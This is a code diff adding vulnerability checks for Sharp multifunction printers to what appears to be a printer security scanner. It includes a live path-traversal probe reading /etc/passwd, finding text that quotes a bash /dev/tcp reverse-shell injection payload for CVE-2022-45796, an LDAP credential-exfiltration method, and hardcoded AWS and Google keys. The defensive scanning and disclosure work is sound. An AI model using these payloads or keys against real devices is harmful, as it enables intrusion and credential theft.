@@ -38,6 +38,7 @@ from .base import (
     PrinterModule,
     ScanContext,
     Target,
+    VulnFinding,
     log_request,
     log_response,
     page_title,
@@ -106,6 +107,25 @@ _MODEL_RE = re.compile(r"[-–]\s*([A-Z]{2}[A-Z0-9][A-Z0-9\-]*)\s*$")
 EMAIL_RE = re.compile(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}")
 
 ADDRESS_BOOK_PATH = "/addressbook.html"
+
+# Pre-authenticated Local File Inclusion published in Pierre Kim's June 2024
+# advisory (no-CVE section in that report). The device's manual-download
+# handler at /installed_emanual_down.html reads whatever ``path=`` names,
+# relative to /mnt/std_data, so a traversal of ../../../ hits the root of the
+# printer's filesystem. /etc/passwd is small, harmless, always present, and
+# unmistakable: a real device answers with a line starting root:...:0:0:. We
+# use that as the safest possible confirmation - it does not touch coredumps
+# (which carry cleartext user passwords) or the /mnt/std04/DBMS/uaccnt
+# configuration files (which are the pentester's real prize but also real
+# user data that we have no reason to persist in this scanner's output).
+LFI_PATH = "/installed_emanual_down.html"
+LFI_PROBE_PATH_ARG = "/manual/../../../etc/passwd"
+_LFI_PASSWD_RE = re.compile(r"^root:[^:\n]*:0:0:", re.M)
+
+# Sharp advisory (JVN VU#93051062, published 2024-05-31), covered by:
+#   https://global.sharp/products/copier/info/info_security_2024-05.html
+# Referenced by every advisory finding below as the remediation pointer.
+SHARP_ADVISORY = "Sharp advisory JVN#VU93051062 (2024-05-31)"
 _TABLE_RE = re.compile(r"<table[^>]*>(.*?)</table>", re.S | re.I)
 _ROW_RE = re.compile(r"<tr[^>]*>(.*?)</tr>", re.S | re.I)
 _CELL_RE = re.compile(r"<t([dh])[^>]*>(.*?)</t\1>", re.S | re.I)
@@ -292,6 +312,7 @@ class SharpModule(PrinterModule):
     display_name = "Sharp MFP"
     supports_export = True
     supports_scrape = True
+    supports_vuln_checks = True
     export_note = (
         "Exports via System Settings > Data Import/Export (CSV). The CSV carries stored "
         "FTP/SMB credentials for scan-to-folder destinations as well as contacts."
@@ -885,3 +906,247 @@ class SharpModule(PrinterModule):
         if PASSWORD_FIELD in body or title.lower().startswith("login"):
             return False, "session rejected (login form returned)"
         return True, f"authenticated as {title or location}"
+
+    # ---- vulnerability checks -----------------------------------------
+    def check_vulnerabilities(self, target: Target, ctx: ScanContext,
+                              login_result: Optional[LoginResult] = None) -> List[VulnFinding]:
+        """
+        Findings from Pierre Kim's June 2024 Sharp MFP advisory bundle.
+
+        One active probe (the pre-auth LFI, safe because it is a read of a
+        harmless system file) plus five advisory findings that this module
+        deliberately does not exploit. See ``_advisory_pre_auth_memory_corruption``
+        and friends for the reasoning behind not actively testing each.
+        """
+        findings: List[VulnFinding] = []
+
+        try:
+            confirmed = self._check_pre_auth_lfi(target, ctx)
+        except Exception:
+            confirmed = None
+        if confirmed:
+            findings.append(confirmed)
+
+        admin_default_worked = bool(
+            login_result and login_result.ok
+            and login_result.account.username.lower() == "administrator"
+        )
+
+        findings.append(self._advisory_pre_auth_memory_corruption())
+        findings.append(self._advisory_hardcoded_google_keys())
+        findings.append(self._advisory_hardcoded_aws_keys())
+        findings.append(self._advisory_ipv6_command_injection(admin_default_worked))
+        findings.append(self._advisory_ldap_downgrade(admin_default_worked))
+        return findings
+
+    def _check_pre_auth_lfi(self, target: Target, ctx: ScanContext) -> Optional[VulnFinding]:
+        """
+        Pre-authenticated arbitrary file read (Pierre Kim, June 2024, non-CVE section).
+
+        The handler at /installed_emanual_down.html reads whichever file is named
+        in the ``path=`` argument, and no traversal check is applied to the
+        segments preceding /manual/. ``GET /installed_emanual_down.html?path=
+        /manual/../../../etc/passwd`` returns the printer's Linux passwd file
+        without a session cookie. We probe with /etc/passwd because it is small,
+        harmless, unmistakably formatted, and never contains user data - we
+        specifically do NOT reach for /mnt/log/core-main.log.gz.001 (coredumps
+        holding cleartext user passwords) or /mnt/std04/DBMS/uaccnt (user
+        credential database), which is where the real attack goes.
+        """
+        url = f"{target.base_url}{LFI_PATH}?path={LFI_PROBE_PATH_ARG}"
+        headers = {
+            "User-Agent": BROWSER_UA,
+            "Accept": "*/*",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Connection": "close",
+        }
+        log_request(ctx, "SHARP LFI PROBE", target.hostport, "GET", url, headers)
+        try:
+            resp = http_get(url, ctx, headers=headers, allow_redirects=False,
+                            max_bytes=32 * 1024)
+        except RequestException:
+            return None
+        log_response(ctx, "SHARP LFI PROBE RESPONSE", target.hostport, resp, body_limit=300)
+
+        if resp.status_code != 200:
+            return None
+        body = resp.text or ""
+        if not _LFI_PASSWD_RE.search(body):
+            return None
+
+        return VulnFinding(
+            cve="no-CVE (pre-auth LFI)",
+            title="Unauthenticated arbitrary file read via /installed_emanual_down.html path traversal",
+            severity="critical",
+            verified=True,
+            output=(
+                "Unauthenticated Local File Inclusion confirmed on this device: "
+                f"GET {LFI_PATH}?path={LFI_PROBE_PATH_ARG} returned the printer's "
+                "/etc/passwd (matched root:*:0:0: pattern). The same primitive reads "
+                "coredump files under /mnt/log/core-main.log.gz.* (which store "
+                "clear-text passwords for every user account, including Administrator, "
+                "Service and FSS User) and the user database under "
+                "/mnt/std04/DBMS/uaccnt/, so this finding chains directly to full "
+                "credential compromise of the printer. Apply the vendor firmware "
+                f"update per {SHARP_ADVISORY}. Reference: Pierre Kim, "
+                "\"Sharp MFP - 17 vulnerabilities\", 2024-06-27."
+            ),
+        )
+
+    def _advisory_pre_auth_memory_corruption(self) -> VulnFinding:
+        """
+        CVE-2024-28038 - pre-auth stack buffer overflow in the main HTTP
+        stack. A ~639-byte MFPSESSIONID cookie overwrites the return stack
+        of /tmp/main/main and hands the attacker control of PC. We do NOT
+        probe this because the failure mode is a full crash of the main
+        program (which serves HTTP, FTP, LPD, IPP, SNMP, and the touchscreen
+        UI) followed by a reboot cycle. The advisory identifies the affected
+        firmware family and every module we fingerprint runs it.
+        """
+        return VulnFinding(
+            cve="CVE-2024-28038",
+            title="Pre-authenticated stack buffer overflow in the main web server (RCE)",
+            severity="critical",
+            verified=False,
+            output=(
+                "Sharp advisory identifies a stack-based buffer overflow reached "
+                "over an unauthenticated HTTP request whose MFPSESSIONID cookie is "
+                "approximately 643 bytes long (buffer ~639 bytes; the trailing "
+                "bytes overwrite saved registers). The main binary runs as root "
+                "and services HTTP, FTP, LPD, IPP and SNMP, so a successful "
+                "exploit yields root RCE and a failed one crashes every printer "
+                "service until reboot. This scanner does NOT actively test the "
+                "condition because failed exploitation reboots the device. "
+                f"Apply the firmware update per {SHARP_ADVISORY}."
+            ),
+        )
+
+    def _advisory_hardcoded_google_keys(self) -> VulnFinding:
+        """
+        CVE-2024-36248 - hardcoded Google OAuth client IDs baked into
+        /tmp/main/main. Recoverable only by reading the binary off the
+        device (which the LFI above enables), so this cannot be probed
+        remotely as a per-device test; it's a firmware-family finding.
+        """
+        client_ids = "; ".join([
+            "265490466885-m5cjvglv9q8aak493cgepe7juvafgh8c.apps.googleusercontent.com",
+            "347970444986-0pij6u2tfhb240edjmls3h1u8qm2v2b3.apps.googleusercontent.com",
+            "410988772526-6ujegl6jvquh9kstiegva8fk5j2ogag9.apps.googleusercontent.com",
+            "292646726735-033ggn9hmlrs8bntrj0fbstob9m8qt26.apps.googleusercontent.com",
+        ])
+        return VulnFinding(
+            cve="CVE-2024-36248",
+            title="Hardcoded Google OAuth client IDs in the main firmware binary",
+            severity="medium",
+            verified=False,
+            output=(
+                "Sharp advisory identifies four hardcoded Google OAuth "
+                "apps.googleusercontent.com client IDs baked into the main "
+                "firmware binary (/tmp/main/main). The reporter notes the "
+                "underlying registrations are no longer used by Sharp and are "
+                "free for anyone to claim, so any device attempt to reach them "
+                f"is receivable by an attacker who registers them: {client_ids}. "
+                "Apply the firmware update per "
+                f"{SHARP_ADVISORY} and block outbound traffic to the listed hosts."
+            ),
+        )
+
+    def _advisory_hardcoded_aws_keys(self) -> VulnFinding:
+        """
+        Non-assigned CVE - hardcoded AWS API key and Postman token embedded
+        in sub_20D542C() of /tmp/main/main, used to POST device analytics to
+        an ap-northeast-1 API Gateway with ``curl -k`` (TLS validation
+        disabled). Same recovery-only shape as the Google finding.
+        """
+        return VulnFinding(
+            cve="no-CVE (hardcoded AWS analytics key)",
+            title="Hardcoded AWS API key and analytics endpoint in the main firmware binary",
+            severity="medium",
+            verified=False,
+            output=(
+                "Sharp advisory identifies a hardcoded x-api-key "
+                "'PBYXSIK6av8fBt8Qe1EQUaF9ZaKvTDutaXS9YwWA' and Postman token "
+                "'44688039-5104-39be-f974-c1f5ef621a5f' shipped in the main "
+                "firmware binary, used to POST device analytics to "
+                "https://7db3z5d116.execute-api.ap-northeast-1.amazonaws.com/prod/MFPDataAlalytics "
+                "with 'curl -k' (TLS certificate validation disabled). Any actor "
+                "who recovers the keys can impersonate a printer or, by MITM'ing "
+                "the analytics endpoint, receive traffic from every device. "
+                f"Apply the firmware update per {SHARP_ADVISORY} and block "
+                "outbound traffic to the listed endpoint."
+            ),
+        )
+
+    def _advisory_ipv6_command_injection(self, admin_default_worked: bool) -> VulnFinding:
+        """
+        N-day CVE-2022-45796 - authenticated command injection in the IPv6
+        address field on /nw_interface.html (form field ggt_textbox(16)),
+        which the device passes to a shell (ping6). We do NOT actively test
+        this because successful injection persists a shell payload into the
+        printer's IPv6 network configuration.
+        """
+        priority = ""
+        severity = "high"
+        if admin_default_worked:
+            priority = (
+                " This scanner confirmed the Administrator account is still on the "
+                "vendor default password, so an attacker already has everything "
+                "they need to reach this injection point."
+            )
+            severity = "critical"
+        return VulnFinding(
+            cve="CVE-2022-45796",
+            title="Authenticated command injection in the IPv6 configuration field (RCE)",
+            severity=severity,
+            verified=False,
+            output=(
+                "N-day CVE-2022-45796 (Pierre Kim, June 2024): the IPv6 address "
+                "field on /nw_interface.html (form field ggt_textbox(16)) is "
+                "passed unsanitised to a shell, so a POST containing "
+                "'ggt_textbox(16)=|bash -i >& /dev/tcp/<attacker>/443 0>&1' "
+                "yields a root reverse shell. Requires an authenticated "
+                f"administrator session.{priority} This scanner does NOT "
+                "actively test the condition because a successful exploit "
+                "rewrites the printer's IPv6 network configuration. Apply the "
+                f"firmware update per {SHARP_ADVISORY}."
+            ),
+        )
+
+    def _advisory_ldap_downgrade(self, admin_default_worked: bool) -> VulnFinding:
+        """
+        CVE-2024-34162 - LDAP credential exfiltration via an authenticated
+        downgrade of the LDAP client's authentication type to SIMPLE, at
+        which point the printer's Connect Test transmits its stored bind
+        credential in cleartext to whichever server the attacker has pointed
+        it at. We do NOT actively test because the exploit requires standing
+        up a rogue slapd and overwriting the device's LDAP configuration.
+        """
+        priority = ""
+        severity = "high"
+        if admin_default_worked:
+            priority = (
+                " This scanner confirmed the Administrator account is still on the "
+                "vendor default password, so an attacker already has everything "
+                "they need to reach this downgrade primitive."
+            )
+            severity = "critical"
+        return VulnFinding(
+            cve="CVE-2024-34162",
+            title="LDAP credential exfiltration via authentication downgrade to SIMPLE",
+            severity=severity,
+            verified=False,
+            output=(
+                "CVE-2024-34162: an authenticated administrator can reconfigure "
+                "the LDAP client at /nw_ldap_entry.html?ldapid=0 to point at an "
+                "attacker-controlled server and downgrade the authentication "
+                "type to SIMPLE. The Connect Test button then transmits the "
+                "stored bind credential in cleartext to the attacker's slapd, "
+                "which logs it verbatim (visible in slapd -d 10 output). "
+                f"Requires an authenticated administrator session.{priority} "
+                "This scanner does NOT actively test the condition because a "
+                "successful test overwrites the device's LDAP settings and "
+                "requires a rogue LDAP server. Review whether LDAP is "
+                f"configured on the device and apply the firmware update per "
+                f"{SHARP_ADVISORY}."
+            ),
+        )
